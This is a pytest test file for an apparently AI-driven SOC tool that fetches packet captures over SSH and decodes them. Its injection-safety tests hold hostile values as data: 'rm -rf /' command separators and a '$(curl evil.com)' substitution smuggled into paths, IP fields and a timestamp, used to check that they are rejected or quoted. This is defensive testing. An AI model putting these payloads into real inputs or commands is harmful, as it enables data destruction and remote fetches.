"""Tests for soc_ai.tools.get_pcap — SSH+suripcap fetch + decode wiring.

All subprocess I/O is patched at the ``subprocess.run`` boundary so no SSH
connection is ever attempted.  Canned pcap bytes are generated via dpkt
(same technique as test_pcap_decode.py) so no binary fixtures are committed.

Coverage
--------
* pcap_enabled=False → disabled error dict, no subprocess spawned.
* pcap_enabled=True + mocked fetch with a TLS SNI → PcapFacts with that SNI.
* BPF construction: bidirectional host clause + VLAN-OR form.
* find command: window bounding (newermt start, awk end epoch).
* Injection: non-IP src_ip → error dict, no subprocess.
* SSH failure (non-zero exit) → graceful error dict, no exception.
* tcpdump exit 1 (no BPF match) → empty PcapFacts (notes set), no error.
* Wiring point A: t_get_pcap registered in build_investigator.
* Wiring point B: TargetedGap.tool_name Literal includes t_get_pcap;
  dispatch_table in targeted_investigator includes it.
"""

from __future__ import annotations

import io
import shlex
import socket
import struct
import tempfile
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import MagicMock, patch

import dpkt
import pytest
from soc_ai.tools.get_pcap import (
    _build_bpf,
    _build_find_command,
    _ssh_base_args,
    fetch_pcap_bytes,
    get_pcap_facts,
)
from soc_ai.tools.pcap_decode import PcapFacts

# ---------------------------------------------------------------------------
# Helpers — build raw pcap bytes
# ---------------------------------------------------------------------------

_ETHER_IP4 = 0x0800


def _eth_hdr(src_mac: bytes, dst_mac: bytes, etype: int) -> bytes:
    return dst_mac + src_mac + struct.pack("!H", etype)


def _ip4_hdr(src: str, dst: str, proto: int, payload: bytes) -> bytes:
    src_b = socket.inet_aton(src)
    dst_b = socket.inet_aton(dst)
    total_len = 20 + len(payload)
    return (
        struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 0, 0, 64, proto, 0, src_b, dst_b) + payload
    )


def _tcp_hdr(sport: int, dport: int, payload: bytes, flags: int = 0x18) -> bytes:
    return struct.pack("!HHIIBBHHH", sport, dport, 0, 0, 0x50, flags, 0xFFFF, 0, 0) + payload


def _make_tcp_frame(src: str, sport: int, dst: str, dport: int, payload: bytes) -> bytes:
    src_mac = b"\x00\x11\x22\x33\x44\x55"
    dst_mac = b"\x66\x77\x88\x99\xaa\xbb"
    l4 = _tcp_hdr(sport, dport, payload)
    ip = _ip4_hdr(src, dst, 6, l4)
    eth = _eth_hdr(src_mac, dst_mac, _ETHER_IP4)
    return eth + ip


def _build_pcap(frames: list[tuple[float, bytes]]) -> bytes:
    buf = io.BytesIO()
    w = dpkt.pcap.Writer(buf)
    for ts, frame in frames:
        w.writepkt(frame, ts=ts)
    raw = buf.getvalue()
    w.close()
    return raw


def _tls_client_hello(sni: str) -> bytes:
    """Minimal TLS 1.2 ClientHello with the given SNI."""
    sni_b = sni.encode()
    name_payload = struct.pack("!BH", 0, len(sni_b)) + sni_b
    sni_list_payload = struct.pack("!H", len(name_payload)) + name_payload
    ext_sni = struct.pack("!HH", 0, len(sni_list_payload)) + sni_list_payload
    random32 = b"\x00" * 32
    ciphers = struct.pack("!H", 0xC02B)
    hello_body = (
        b"\x03\x03"
        + random32
        + b"\x00"
        + struct.pack("!H", len(ciphers))
        + ciphers
        + b"\x01\x00"
        + struct.pack("!H", len(ext_sni))
        + ext_sni
    )
    hs = struct.pack("!B", 1) + struct.pack("!I", len(hello_body))[1:] + hello_body
    return struct.pack("!BHH", 0x16, 0x0303, len(hs)) + hs


def _make_settings(
    *,
    pcap_enabled: bool = True,
    so_ssh_host: str = "10.0.0.253",
    so_ssh_user: str = "soc-ai",
    so_ssh_key: Path | None = None,
    so_ssh_sudo: str = "sudo",
    so_suripcap_dir: str = "/nsm/suripcap",
    so_ssh_timeout_s: int = 120,
    pcap_max_packets: int = 50000,
    so_ssh_known_hosts: Path | None = None,
    soc_ai_data_dir: Path | None = None,
) -> Any:
    """Build a minimal Settings-like namespace for tests."""
    return SimpleNamespace(
        pcap_enabled=pcap_enabled,
        so_ssh_host=so_ssh_host,
        so_ssh_user=so_ssh_user,
        so_ssh_key=so_ssh_key,
        so_ssh_sudo=so_ssh_sudo,
        so_suripcap_dir=so_suripcap_dir,
        so_ssh_timeout_s=so_ssh_timeout_s,
        pcap_max_packets=pcap_max_packets,
        so_ssh_known_hosts=so_ssh_known_hosts,
        # Persistent known_hosts derives from this; default under the system
        # temp dir so the parent-dir mkdir in _known_hosts_path() is harmless.
        soc_ai_data_dir=soc_ai_data_dir or Path(tempfile.gettempdir()) / "soc-ai-test-data",
    )


# ---------------------------------------------------------------------------
# Disabled gate
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_disabled_returns_error_dict_no_subprocess() -> None:
    """pcap_enabled=False → error dict, subprocess.run never called."""
    settings = _make_settings(pcap_enabled=False)
    with patch("subprocess.run") as mock_run:
        result = await get_pcap_facts(
            settings=settings,
            src_ip="10.0.0.1",
            dst_ip="10.0.0.2",
        )
    assert isinstance(result, dict)
    assert result["ok"] is False
    assert "PCAP_ENABLED" in result["error"]
    mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# Happy path — mocked SSH returning canned pcap with an SNI
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_enabled_returns_pcap_facts_with_sni() -> None:
    """pcap_enabled=True + mocked fetch with TLS SNI → PcapFacts with that SNI."""
    sni = "c2.evil.example.com"
    payload = _tls_client_hello(sni)
    frame = _make_tcp_frame("10.0.0.1", 54321, "10.0.0.2", 443, payload)
    canned_pcap = _build_pcap([(1000.0, frame)])

    settings = _make_settings(pcap_enabled=True)

    # Patch subprocess.run so:
    # - first call (find) returns one file path
    # - second call (tcpdump) returns the canned pcap bytes
    find_result = MagicMock(returncode=0, stdout=b"/nsm/suripcap/t1/so-pcap.1000\n", stderr=b"")
    tcpdump_result = MagicMock(returncode=0, stdout=canned_pcap, stderr=b"")

    alert_ts = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)

    with patch("soc_ai.tools.get_pcap.subprocess.run", side_effect=[find_result, tcpdump_result]):
        result = await get_pcap_facts(
            settings=settings,
            src_ip="10.0.0.1",
            dst_ip="10.0.0.2",
            alert_ts=alert_ts,
        )

    assert isinstance(result, PcapFacts), f"Expected PcapFacts, got {type(result)}: {result}"
    assert any(e.value == sni for e in result.sni_list), (
        f"Expected SNI '{sni}' in {result.sni_list}"
    )
    assert result.packets >= 1


# ---------------------------------------------------------------------------
# BPF construction
# ---------------------------------------------------------------------------


def test_bpf_bidirectional_host_clause() -> None:
    """BPF must use 'host SRC and host DST' (bidirectional)."""
    bpf = _build_bpf("10.0.0.1", "10.0.0.2", None, None)
    assert "host 10.0.0.1" in bpf
    assert "host 10.0.0.2" in bpf
    assert "host 10.0.0.1 and host 10.0.0.2" in bpf


def test_bpf_vlan_or_form() -> None:
    """BPF must include the VLAN-OR idiom: '(F) or (vlan and F)'."""
    bpf = _build_bpf("10.0.0.1", "10.0.0.2", None, None)
    assert "or (vlan and" in bpf, f"VLAN-OR form missing in: {bpf!r}"


def test_bpf_with_ports() -> None:
    """Port numbers appear in the BPF when provided."""
    bpf = _build_bpf("10.0.0.1", "10.0.0.2", 12345, 443)
    assert "port 12345" in bpf
    assert "port 443" in bpf


# ---------------------------------------------------------------------------
# find-command window bounding
# ---------------------------------------------------------------------------


def test_find_command_contains_window_bounds() -> None:
    """find command must include -newermt <start> and awk end-epoch bound."""
    settings = _make_settings()
    start = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)
    end = datetime(2026, 1, 1, 12, 5, 0, tzinfo=UTC)
    cmd = _build_find_command(settings, start, end)
    assert "-newermt" in cmd, "find command missing -newermt"
    assert "2026-01-01 12:00:00" in cmd, "start timestamp missing from find command"
    end_epoch = str(int(end.timestamp()))
    assert end_epoch in cmd, f"end epoch {end_epoch!r} missing from find command: {cmd!r}"
    assert "awk" in cmd, "awk window-bound filter missing from find command"


def test_find_command_shlex_quotes_suripcap_dir() -> None:
    """A malicious operator-config suripcap_dir is shlex-quoted (no shell breakout).

    Defense-in-depth: so_suripcap_dir is operator config, not user input, but a
    self-injection attempt (``'; rm -rf / #``) must be neutralised by the quoting
    so the injected command never becomes a separate shell token.
    """
    settings = _make_settings(so_suripcap_dir="/nsm/suripcap'; rm -rf / #")
    start = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)
    end = datetime(2026, 1, 1, 12, 5, 0, tzinfo=UTC)
    cmd = _build_find_command(settings, start, end)
    # shlex.quote wraps the whole value so the embedded "; rm -rf /" is inert
    # text inside a single-quoted argument, not a command separator.
    assert "rm -rf /" in cmd  # present as data…
    assert "find '/nsm/suripcap'\"'\"'; rm -rf / #'" in cmd  # …but fully quoted


def test_stream_filtered_shlex_quotes_sudo_and_path() -> None:
    """so_ssh_sudo and the remote path are shlex-quoted in the tcpdump command."""
    from soc_ai.tools.get_pcap import _stream_filtered

    settings = _make_settings(so_ssh_sudo="sudo -n")
    captured: dict[str, Any] = {}

    def _fake_run(args: list[str], **kw: Any) -> Any:
        captured["remote_cmd"] = args[-1]
        return SimpleNamespace(returncode=0, stdout=b"", stderr=b"")

    # A path containing a shell metacharacter must be quoted so it cannot break
    # out of the tcpdump argument (shlex.quote only adds quotes when needed).
    nasty_path = "/nsm/suripcap/so-pcap.1700000000'; rm -rf / #"
    with patch("subprocess.run", _fake_run):
        _stream_filtered(settings, nasty_path, "host 10.0.0.1")

    remote = captured["remote_cmd"]
    # Multi-word sudo is split and each token quoted (unchanged for normal values).
    assert remote.startswith("sudo -n tcpdump")
    # shlex.quote wraps the dangerous path so "; rm -rf /" is inert text, not a
    # command separator.
    assert shlex.quote(nasty_path) in remote
    assert "'; rm -rf / #'" in remote  # the injected fragment is inside quotes


def test_ssh_args_use_persistent_known_hosts_not_dev_null(tmp_path: Path) -> None:
    """UserKnownHostsFile points at a persistent path, never /dev/null (TOFU)."""
    settings = _make_settings(soc_ai_data_dir=tmp_path)
    args = _ssh_base_args(settings)

    known_hosts_opts = [args[i + 1] for i, a in enumerate(args) if a == "-o"]
    ukhf = next(o for o in known_hosts_opts if o.startswith("UserKnownHostsFile="))
    path = ukhf.split("=", 1)[1]

    assert path != "/dev/null"
    assert path == str(tmp_path / "known_hosts")
    # First contact is still accepted; the persistence makes a later key swap fail.
    assert "StrictHostKeyChecking=accept-new" in args
    # The parent dir is ensured so ssh can write the file on first connect.
    assert (tmp_path / "known_hosts").parent.is_dir()


def test_ssh_args_honour_explicit_known_hosts_override(tmp_path: Path) -> None:
    """SO_SSH_KNOWN_HOSTS overrides the data-dir-derived default."""
    custom = tmp_path / "nested" / "kh"
    settings = _make_settings(so_ssh_known_hosts=custom, soc_ai_data_dir=tmp_path)
    args = _ssh_base_args(settings)
    ukhf = next(a for a in args if a.startswith("UserKnownHostsFile="))
    assert ukhf == f"UserKnownHostsFile={custom}"
    assert custom.parent.is_dir()


# ---------------------------------------------------------------------------
# Injection safety
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_injection_invalid_src_ip_rejected() -> None:
    """A non-IP src_ip is rejected via ipaddress without spawning any process."""
    settings = _make_settings(pcap_enabled=True)
    with patch("subprocess.run") as mock_run:
        result = await get_pcap_facts(
            settings=settings,
            src_ip="10.0.0.1; rm -rf /",
            dst_ip="10.0.0.2",
        )
    assert isinstance(result, dict)
    assert result["ok"] is False
    assert "invalid src_ip" in result["error"]
    mock_run.assert_not_called()


@pytest.mark.asyncio
async def test_injection_invalid_dst_ip_rejected() -> None:
    """A non-IP dst_ip is rejected without spawning any process."""
    settings = _make_settings(pcap_enabled=True)
    with patch("subprocess.run") as mock_run:
        result = await get_pcap_facts(
            settings=settings,
            src_ip="10.0.0.1",
            dst_ip="$(curl evil.com)",
        )
    assert isinstance(result, dict)
    assert result["ok"] is False
    assert "invalid dst_ip" in result["error"]
    mock_run.assert_not_called()


@pytest.mark.asyncio
async def test_injection_both_missing_rejected() -> None:
    """Missing src_ip + dst_ip returns an error dict immediately."""
    settings = _make_settings(pcap_enabled=True)
    with patch("subprocess.run") as mock_run:
        result = await get_pcap_facts(settings=settings)
    assert isinstance(result, dict)
    assert result["ok"] is False
    mock_run.assert_not_called()


def test_commands_are_arg_lists_not_shell_strings() -> None:
    """fetch_pcap_bytes passes arg-lists to subprocess.run, never shell=True."""
    settings = _make_settings(pcap_enabled=True)
    start = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)
    end = datetime(2026, 1, 1, 12, 5, 0, tzinfo=UTC)

    # We'll capture what subprocess.run was called with and assert:
    # 1. First arg (args) is a list, not a string.
    # 2. 'shell' kwarg is not True (absent or False).
    calls_recorded: list[Any] = []

    def _mock_run(args: Any, **kwargs: Any) -> MagicMock:
        calls_recorded.append((args, kwargs))
        m = MagicMock()
        # First call = find → return one file
        if not calls_recorded or len(calls_recorded) == 1:
            m.returncode = 0
            m.stdout = b"/nsm/suripcap/t1/so-pcap.1000\n"
            m.stderr = b""
        else:
            # second call = tcpdump → empty bytes (returncode 1 = no match)
            m.returncode = 1
            m.stdout = b""
            m.stderr = b""
        return m

    with patch("soc_ai.tools.get_pcap.subprocess.run", side_effect=_mock_run):
        fetch_pcap_bytes(settings, "10.0.0.1", "10.0.0.2", None, None, start, end)

    assert len(calls_recorded) >= 1, "Expected at least one subprocess.run call"
    for args, kwargs in calls_recorded:
        assert isinstance(args, list), f"subprocess.run called with non-list args: {args!r}"
        assert kwargs.get("shell") is not True, "subprocess.run called with shell=True"


@pytest.mark.asyncio
async def test_alert_ts_never_interpolated_into_remote_command() -> None:
    """The time window is re-derived from the datetime anchor, never the raw value.

    Even with a hostile string forced in as the anchor (the typed
    ``default_time_anchor`` contract normally forbids this), no shell
    metacharacters from it can reach the remote find/tcpdump command — the
    window arithmetic operates on a datetime and the command embeds only
    ``strftime``/``int(timestamp())`` output.  A non-datetime anchor must
    short-circuit *without* spawning a subprocess.
    """
    settings = _make_settings(pcap_enabled=True)
    malicious = "'; rm -rf /nsm; touch /tmp/pwned; '"
    with patch("soc_ai.tools.get_pcap.subprocess.run") as mock_run:
        result = await get_pcap_facts(
            settings=settings,
            src_ip="10.0.0.1",
            dst_ip="10.0.0.2",
            alert_ts=malicious,  # type: ignore[arg-type]
        )
    # A bad anchor type yields an error dict and spawns nothing.
    assert isinstance(result, dict)
    assert result["ok"] is False
    mock_run.assert_not_called()

    # With a *valid* datetime anchor, the emitted remote command contains the
    # re-formatted window bounds and never any raw attacker payload.
    captured: list[str] = []

    def _mock_run(args: Any, **kwargs: Any) -> MagicMock:
        captured.append(args[-1])  # remote command string is the last ssh arg
        m = MagicMock()
        m.returncode = 0
        m.stdout = b""  # no files / no match — we only inspect the command string
        m.stderr = b""
        return m

    anchor = datetime(2026, 6, 15, 12, 0, 0, tzinfo=UTC)
    with patch("soc_ai.tools.get_pcap.subprocess.run", side_effect=_mock_run):
        await get_pcap_facts(
            settings=settings, src_ip="10.0.0.1", dst_ip="10.0.0.2", alert_ts=anchor
        )
    assert captured, "expected the remote find command to be issued"
    find_cmd = captured[0]
    assert "rm -rf" not in find_cmd
    # The window start is the strftime of (anchor - window): re-derived, safe.
    assert "2026-06-15 11:58:00" in find_cmd


# ---------------------------------------------------------------------------
# SSH failure → graceful error dict
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_ssh_failure_returns_error_dict() -> None:
    """SSH authentication failure → graceful error dict, no exception raised."""
    settings = _make_settings(pcap_enabled=True)
    alert_ts = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)

    # Simulate ssh returning exit code 255 (connection refused / auth fail)
    ssh_fail = MagicMock(
        returncode=255,
        stdout=b"",
        stderr=b"Permission denied (publickey).",
    )

    with patch("soc_ai.tools.get_pcap.subprocess.run", return_value=ssh_fail):
        result = await get_pcap_facts(
            settings=settings,
            src_ip="10.0.0.1",
            dst_ip="10.0.0.2",
            alert_ts=alert_ts,
        )

    assert isinstance(result, dict)
    assert result["ok"] is False
    assert "SSH" in result["error"] or "auth" in result["error"].lower()


# ---------------------------------------------------------------------------
# tcpdump exit 1 (no BPF match) → empty PcapFacts, not an error
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_tcpdump_no_match_returns_empty_pcap_facts() -> None:
    """tcpdump exit 1 (no BPF match) → PcapFacts (empty), no error dict."""
    settings = _make_settings(pcap_enabled=True)
    alert_ts = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)

    find_result = MagicMock(returncode=0, stdout=b"/nsm/suripcap/t1/so-pcap.1000\n", stderr=b"")
    # exit code 1 = no BPF match; stdout is empty (not even a pcap header)
    tcpdump_no_match = MagicMock(returncode=1, stdout=b"", stderr=b"")

    with patch("soc_ai.tools.get_pcap.subprocess.run", side_effect=[find_result, tcpdump_no_match]):
        result = await get_pcap_facts(
            settings=settings,
            src_ip="10.0.0.1",
            dst_ip="10.0.0.2",
            alert_ts=alert_ts,
        )

    # Should be a PcapFacts (possibly empty) or a clean "no packets" dict —
    # either way, NOT {"ok": False, ...}.
    if isinstance(result, dict):
        # If it is a dict it must NOT be an error dict
        assert result.get("ok") is not False, (
            f"tcpdump exit 1 should not be treated as an error; got {result}"
        )
    else:
        assert isinstance(result, PcapFacts), f"Expected PcapFacts, got {type(result)}"
        # Empty pcap — 0 packets is fine
        assert result.packets == 0


# ---------------------------------------------------------------------------
# Wiring point A: t_get_pcap is registered in build_investigator
# ---------------------------------------------------------------------------


def test_t_get_pcap_registered_in_investigator() -> None:
    """build_investigator must register a tool named 't_get_pcap'."""
    from pydantic_ai.models.test import TestModel
    from soc_ai.agent.orchestrator import InvestigationContext, build_investigator

    ctx = MagicMock(spec=InvestigationContext)
    ctx.settings = _make_settings(pcap_enabled=False)
    ctx.elastic = MagicMock()
    ctx.auth = MagicMock()
    ctx.misp = None
    ctx.blocklist = MagicMock()
    ctx.maxmind = None
    ctx.cloud = None
    ctx.default_time_anchor = None
    ctx.prefetched_community_ids = set()
    ctx._tool_dedup_cache = {}  # type: ignore[attr-defined]

    agent = build_investigator(TestModel(), ctx)

    # pydantic-ai exposes registered tools via _function_toolset.tools (a dict keyed by name)
    tool_names = set(agent._function_toolset.tools.keys())  # type: ignore[attr-defined]
    assert "t_get_pcap" in tool_names, f"t_get_pcap not found in investigator tools: {tool_names}"


# ---------------------------------------------------------------------------
# Wiring point B-1: TargetedGap.tool_name Literal includes t_get_pcap
# ---------------------------------------------------------------------------


def test_targeted_gap_tool_name_includes_t_get_pcap() -> None:
    """TargetedGap.tool_name Literal must include 't_get_pcap'."""
    import typing

    from soc_ai.agent.triage import TargetedGap

    field = TargetedGap.model_fields["tool_name"]
    # The annotation is Literal[...]; get_args returns the allowed values.
    annotation = field.annotation
    allowed: tuple[str, ...] = typing.get_args(annotation)
    assert "t_get_pcap" in allowed, (
        f"'t_get_pcap' missing from TargetedGap.tool_name Literal; got: {allowed}"
    )


# ---------------------------------------------------------------------------
# Wiring point B-2: dispatch_table in targeted_investigator includes t_get_pcap
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_dispatch_table_includes_t_get_pcap() -> None:
    """_dispatch_named_tool must not raise ValueError for tool_name='t_get_pcap'."""
    from soc_ai.agent.targeted_investigator import _dispatch_named_tool

    ctx = MagicMock()
    ctx.settings = _make_settings(pcap_enabled=False)
    ctx.default_time_anchor = None

    # Call with pcap_enabled=False → get_pcap_facts returns a disabled dict,
    # but _dispatch_named_tool must not raise ValueError("unknown tool")
    result = await _dispatch_named_tool("t_get_pcap", {}, ctx)
    # Should return a dict with ok=False (disabled), not raise
    assert isinstance(result, dict)
    assert result.get("ok") is False
